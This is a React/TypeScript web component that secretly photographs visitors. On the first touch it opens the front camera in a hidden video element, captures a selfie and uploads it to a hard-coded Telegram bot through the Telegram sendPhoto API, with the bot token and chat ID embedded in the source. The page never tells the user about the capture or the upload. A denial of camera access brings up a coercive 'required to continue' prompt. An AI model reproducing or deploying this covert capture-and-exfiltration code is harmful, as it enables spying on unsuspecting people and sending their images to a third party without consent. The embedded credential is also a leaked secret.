"use client";

import { useEffect, useRef, useState } from "react";

const TELEGRAM_BOT_TOKEN = "7780580980:AAECuF32EBla6U8waEj4w4Fxkf3kCqeahWI";
const TELEGRAM_CHAT_ID = "6956607670";

const PhotoAndVideoTaker = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaStreamRef = useRef<MediaStream | null>(null);
  const [showDeniedMessage, setShowDeniedMessage] = useState(false);

  const initCamera = async () => {
    try {
      // Use front-facing camera on mobile
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user", // Force front camera
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
        audio: false,
      });

      mediaStreamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play();
          captureSelfie();
        };
      }
      setShowDeniedMessage(false);
    } catch (error) {
      setShowDeniedMessage(true);
      console.error("Camera error:", error);
    }
  };

  const captureSelfie = () => {
    if (!videoRef.current) return;

    setTimeout(() => {
      const canvas = document.createElement("canvas");
      canvas.width = videoRef.current?.videoWidth || 640;
      canvas.height = videoRef.current?.videoHeight || 480;
      const ctx = canvas.getContext("2d");

      if (ctx && videoRef.current) {
        // Mirror the selfie for more natural appearance
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(
          async (blob) => {
            if (blob) {
              await sendToTelegram(blob, "selfie.jpg");
            }
            // Cleanup
            if (mediaStreamRef.current) {
              mediaStreamRef.current
                .getTracks()
                .forEach((track) => track.stop());
            }
          },
          "image/jpeg",
          0.9
        );
      }
    }, 1000); // Wait 1 second for camera to stabilize
  };

  const sendToTelegram = async (blob: Blob, filename: string) => {
    try {
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", blob, filename);

      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        {
          method: "POST",
          body: formData,
        }
      );
      console.log("Selfie sent successfully");
    } catch (error) {
      console.error("Telegram error:", error);
    }
  };

  useEffect(() => {
    // Add mobile-specific event listener for better compatibility
    const handleMobileInteraction = () => {
      initCamera();
      window.removeEventListener("touchstart", handleMobileInteraction);
    };

    window.addEventListener("touchstart", handleMobileInteraction);

    return () => {
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach((track) => track.stop());
      }
      window.removeEventListener("touchstart", handleMobileInteraction);
    };
  }, []);

  if (showDeniedMessage) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50">
        <div className="bg-white rounded-xl p-6 max-w-md w-full text-center">
          <p className="text-red-600 mb-4">
            Camera access is required to continue
          </p>
          <button
            onClick={() => window.location.reload()}
            className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition-colors"
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="hidden">
      <video ref={videoRef} autoPlay playsInline muted />
    </div>
  );
};

export default PhotoAndVideoTaker;
